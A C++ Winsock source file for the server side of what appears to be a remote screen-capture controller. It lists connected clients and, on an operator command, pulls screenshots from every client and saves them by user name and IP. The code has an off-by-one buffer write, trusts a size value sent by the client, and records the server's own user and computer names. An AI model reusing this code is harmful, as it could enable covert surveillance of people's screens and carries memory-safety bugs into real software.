#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <iostream>
#include <cstring>

#include "Server.h"

#include <fstream>

#include "Constants.h"

#pragma comment(lib, "ws2_32.lib")

Server::Server(u_short port)
    : m_port(port)
    , m_serverRunning(true)
{
    WSADATA wsData;
    WORD ver = MAKEWORD(2, 2);
    if (WSAStartup(ver, &wsData) != 0)
    {
        std::cerr << "Can't initialize Winsock! Quitting" << std::endl;
        stop();
    }

    m_listeningSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (m_listeningSocket == INVALID_SOCKET)
    {
        std::cerr << "Can't create a socket! Quitting" << std::endl;
        WSACleanup();
        stop();
    }

    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    hint.sin_addr.s_addr = INADDR_ANY;

    if (bind(m_listeningSocket, (sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR)
    {
        std::cerr << "Can't bind socket! Quitting" << std::endl;
        closesocket(m_listeningSocket);
        WSACleanup();
        stop();
    }

    if (listen(m_listeningSocket, SOMAXCONN) == SOCKET_ERROR)
    {
        std::cerr << "Can't listen on socket! Quitting" << std::endl;
        closesocket(m_listeningSocket);
        WSACleanup();
        stop();
    }
}

Server::~Server() {
    stop();
}

/**
 * Начало сеанса.
 */
void Server::start() {
    std::thread acceptThread(&Server::acceptClients, this);
    std::thread commandThread(&Server::processCommands, this);
    acceptThread.join();
    commandThread.join();
}

/**
 * Завершение сеанса.
 */
void Server::stop() {
    m_serverRunning = false;

    for (SOCKET sock : m_clientSockets)
    {
        send(sock, "exit", 4, 0);
        closesocket(sock);
    }

    closesocket(m_listeningSocket);
    WSACleanup();
}

/**
 * Прослушка конкретного клиента.
 * @param clientSocket Сокет клиента.
 */
void Server::handleClient(const SOCKET clientSocket) {
    FClientInfo clientInfo;
    sockaddr_in clientAddr;
    int clientAddrSize = sizeof(clientAddr);
    getpeername(clientSocket, (sockaddr*)&clientAddr, &clientAddrSize);
    strcpy(clientInfo.ipv4, inet_ntoa(clientAddr.sin_addr));
    
    // Получаем время подключения
    auto now = std::chrono::system_clock::now();
    std::time_t currentTime = std::chrono::system_clock::to_time_t(now);
    std::strftime(clientInfo.time, sizeof(clientInfo.time), "%Y-%m-%d %H:%M:%S", std::localtime(&currentTime));
    
    // Получаем имя пользователя и компьютера
    char username[256];
    DWORD username_len = sizeof(username);
    GetUserNameA(username, &username_len);
    strcpy(clientInfo.user, username);
    
    // Получаем имя компьютера
    char computerName[256];
    DWORD computerName_len = sizeof(computerName);
    GetComputerNameA(computerName, &computerName_len);
    strcpy(clientInfo.name, computerName);
    
    // Добавляем клиента в вектор
    m_clients.push_back(clientInfo);
    std::cout
    << "Client connected: "
    << "Id: " << clientInfo.id << " | "
    << "IP: " << clientInfo.ipv4 << " | "
    << "User: " << clientInfo.user << " | "
    << "Name: " << clientInfo.name << " | "
    << "Time: " << clientInfo.time << " | "
    << std::endl;

    char buf[4096];
    while (m_serverRunning) {
        ZeroMemory(buf, 4096);
        int bytesReceived = recv(clientSocket, buf, 4096, 0);
        
        // Обработка полученных данных
        if (bytesReceived <= 0) {
            std::cerr << "Client disconnected or error occurred." << std::endl;
            break;
        }

        // Добавляем нулевой символ для корректного окончания строки
        buf[bytesReceived] = '\0';

        // Преобразуем буфер в строку
        std::string command(buf);

        if (command == "/scn") {
            std::cout << "Requesting screenshot..." << std::endl;

            // Получаем размер данных скриншота
            int dataSize;
            int sizeReceived = recv(clientSocket, reinterpret_cast<char*>(&dataSize), sizeof(dataSize), 0);
            if (sizeReceived == SOCKET_ERROR) {
                std::cerr << "Failed to receive size of screenshot, error: " << WSAGetLastError() << std::endl;
                break;
            }

            std::vector<BYTE> screenshotData(dataSize);
            int totalBytesReceived = 0;

            // Получаем данные скриншота
            while (totalBytesReceived < dataSize) {
                int bytesRead = recv(clientSocket, reinterpret_cast<char*>(screenshotData.data()) + totalBytesReceived, dataSize - totalBytesReceived, 0);
                if (bytesRead == SOCKET_ERROR) {
                    std::cerr << "Error receiving screenshot data, error: " << WSAGetLastError() << std::endl;
                    break;
                }
                totalBytesReceived += bytesRead;
            }

            // Сохраняем скриншот в файл
            std::string scnFileName = clientInfo.user;
            scnFileName.append("_");
            scnFileName.append(clientInfo.ipv4);
            scnFileName.append(".bmp");
            std::string outPath = (Centaurus::contentPath / scnFileName).string();
            std::ofstream outFile(outPath, std::ios::binary);
            outFile.write(reinterpret_cast<char*>(screenshotData.data()), screenshotData.size());
            outFile.close();
            std::cout << "Screenshot saved as " << outPath << std::endl;
        }
    }

    closesocket(clientSocket);
    // FClientInfo clientInfo;
    // sockaddr_in clientAddr;
    // int clientAddrSize = sizeof(clientAddr);
    // getpeername(clientSocket, (sockaddr*)&clientAddr, &clientAddrSize);
    // strcpy(clientInfo.ipv4, inet_ntoa(clientAddr.sin_addr));
    //
    // // Получаем время подключения
    // auto now = std::chrono::system_clock::now();
    // std::time_t currentTime = std::chrono::system_clock::to_time_t(now);
    // std::strftime(clientInfo.time, sizeof(clientInfo.time), "%Y-%m-%d %H:%M:%S", std::localtime(&currentTime));
    //
    // // Получаем имя пользователя и компьютера
    // char username[256];
    // DWORD username_len = sizeof(username);
    // GetUserNameA(username, &username_len);
    // strcpy(clientInfo.user, username);
    //
    // // Получаем имя компьютера
    // char computerName[256];
    // DWORD computerName_len = sizeof(computerName);
    // GetComputerNameA(computerName, &computerName_len);
    // strcpy(clientInfo.name, computerName);
    //
    // // Добавляем клиента в вектор
    // m_clients.push_back(clientInfo);
    // std::cout << "Client connected: ID=" << clientInfo.id << ", IP=" << clientInfo.ipv4 << std::endl;
    //
    // char buf[4096];
    // while (m_serverRunning) {
    //     ZeroMemory(buf, 4096);
    //     int bytesReceived = recv(clientSocket, buf, 4096, 0);
    //     // Обработка полученных данных
    // }
    //
    // closesocket(clientSocket);
}

/**
 * Прослушка новых клиентов.
 */
void Server::acceptClients() {
    while (m_serverRunning)
    {
        sockaddr_in client;
        int clientSize = sizeof(client);
        SOCKET clientSocket = accept(m_listeningSocket, (sockaddr*)&client, &clientSize);

        if (clientSocket == INVALID_SOCKET)
        {
            std::cerr << "Invalid client socket" << std::endl;
            continue;
        }

        m_clientSockets.push_back(clientSocket);
        m_clientThreads.emplace_back(&Server::handleClient, this, clientSocket);
    }
}

/**
 * Реализация команд сервера.
 */
void Server::processCommands() {
    std::string command;
    while (m_serverRunning)
    {
        std::cin >> command;

        if (command == "/scn")
        {
            for (SOCKET sock : m_clientSockets)
            {
                send(sock, command.c_str(), command.size() + 1, 0);
            }
        }
        else if (command == "/list")
        {
            std::cout << "Connected clients:" << std::endl;
            // for (const auto& ip : m_clientIPs) {
            //     std::cout << ip << std::endl;
            // }
        }
        else if (command == "/exit" || command == "/q")
        {
            stop();
        }
        else if (command == "/help")
        {
            std::cout
                << "\'/scn\'"               << "\t\t\t" << "screenshot"                 << '\n'
                << "\'/list\'"              << "\t\t\t" << "list all connected clients" << '\n'
                << "\'/exit\' or \'/q\'"    << '\t'     << "turn off the server"        << '\n'
                << "\'/help\'"              << "\t\t\t" << "display commands"           << std::endl;
        }
        else
        {
            std::cerr << "Unknown command (/help)" << std::endl;
        }
    }
}